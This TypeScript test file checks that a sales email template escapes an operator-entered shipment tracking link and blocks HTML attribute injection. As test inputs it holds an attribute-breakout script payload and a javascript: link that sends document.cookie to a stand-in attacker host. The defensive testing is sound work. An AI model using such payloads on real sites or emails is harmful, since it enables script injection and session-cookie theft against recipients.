import { test } from "node:test";
import assert from "node:assert/strict";
import { escapeHtml, etaReminderHtml } from "../src/lib/sales/emailTemplates.ts";

// The tracking link is the one free-text field in the sales email templates that
// an operator types and that then lands inside an HTML attribute. The shipping
// PATCH route validates it on the way in, but the route is a filter and this
// template is the injection point: the first version of that guard was
// /^https?:\/\/\S+$/i, which blocked "javascript:" and happily accepted
//     https://a.com"><script>...</script>
// because it contains no whitespace — and etaReminderHtml then interpolated it
// raw into href="${trackingLink}" and into the visible link text, so it broke
// straight out of the attribute in a customer-facing ETA reminder.
//
// These pin the durable half of the fix: whatever reaches this template, and
// however it got stored (rows written before any guard existed are still in
// sales_shipment_docs), the rendered mail is safe. Measured 2026-09-03: 32
// sales_shipment_docs rows, 0 carrying a tracking_link at all, so none of this
// is refusing anything that exists — it is here before the field gets used.

function order(trackingLink: string | null) {
  return {
    container: {
      eta: new Date("2026-10-14T00:00:00Z"),
      containerNumber: "MSBU1095261",
      vesselName: "Sree Hari Om",
      trackingLink,
      trackingUrl: null,
    },
    sp: { name: "Pacific Engineered Surfaces Pvt. Ltd." },
  };
}

// ---------------------------------------------------------------------------
// escapeHtml
// ---------------------------------------------------------------------------

test("escapeHtml neutralises every character that can end an attribute", () => {
  assert.equal(escapeHtml(`a"b`), "a&quot;b");
  assert.equal(escapeHtml("a'b"), "a&#39;b");
  assert.equal(escapeHtml("a<b>c"), "a&lt;b&gt;c");
  assert.equal(escapeHtml("a&b"), "a&amp;b");
});

test("escapeHtml escapes the ampersand first, so nothing is double-encoded", () => {
  // If & were escaped last, "a<b" would become "a&amp;lt;b" and the customer
  // would read the entity instead of the character.
  assert.equal(escapeHtml("a<b"), "a&lt;b");
});

// ---------------------------------------------------------------------------
// etaReminderHtml — what actually reaches the customer
// ---------------------------------------------------------------------------

test("a real carrier tracking link survives intact and stays clickable", () => {
  // The regression risk on the other side: a guard that mangles or drops a
  // legitimate link is worse than the injection it prevents, because the ETA
  // reminder then goes out with no way for the customer to track the shipment
  // — which is the bug that put trackingLink back in the route's allow-list.
  const url = "https://track.cma-cgm.com/csinfo?SearchBy=Container&Reference=MSBU1095261";
  const html = etaReminderHtml("Acme Stone", order(url));
  // & is written as &amp; inside the href — correct HTML, and browsers and mail
  // clients decode it back to the exact URL above when the link is followed.
  assert.match(html, /<a href="https:\/\/track\.cma-cgm\.com\/csinfo\?SearchBy=Container&amp;Reference=MSBU1095261">/);
  assert.ok(!html.includes("Container No:"), "should show the link, not fall back to the container line");
});

test("an attribute-breakout payload cannot escape the href", () => {
  const html = etaReminderHtml("Acme Stone", order(`https://a.com"><script>alert(1)</script>`));
  assert.ok(!html.includes("<script>"), "the script tag must not survive into the mail");
  // Note: match on the payload itself, not on a bare `"><` — the template's own
  // `<meta charset="UTF-8">` legitimately contains that sequence.
  assert.ok(!html.includes(`a.com">`), "the payload must not close the href attribute");
  assert.match(html, /&quot;&gt;&lt;script&gt;/);
});

test("a javascript: link is never rendered as a link", () => {
  // Legacy rows predate the route guard entirely, so this value can be sitting
  // in the column already. Fall back to the container/vessel line instead of
  // mailing the customer a live script link.
  const html = etaReminderHtml("Acme Stone", order("javascript:fetch('//evil.example/'+document.cookie)"));
  assert.ok(!html.includes("javascript:"), "must not emit a javascript: href");
  assert.match(html, /Container No:/, "falls back to the container/vessel line");
});

test("a scheme-less host falls back rather than emitting a dead relative href", () => {
  const html = etaReminderHtml("Acme Stone", order("track.cma-cgm.com/csinfo?x=1"));
  assert.ok(!html.includes("<a href="), "a bare host is a broken relative link in a mail client");
  assert.match(html, /Container No:/);
});

test("no tracking link at all keeps the existing container/vessel fallback", () => {
  const html = etaReminderHtml("Acme Stone", order(null));
  assert.match(html, /Container No:/);
  assert.match(html, /Sree Hari Om/);
});

test("a custom body still bypasses the template entirely", () => {
  // customBody is an operator-authored override and has always been passed
  // through as HTML — this test exists so that contract is not changed by
  // accident while tightening the link handling around it.
  const html = etaReminderHtml("Acme Stone", order("https://ok.example/"), "<p>Hand written</p>");
  assert.match(html, /Hand written/);
  assert.ok(!html.includes("ok.example"));
});
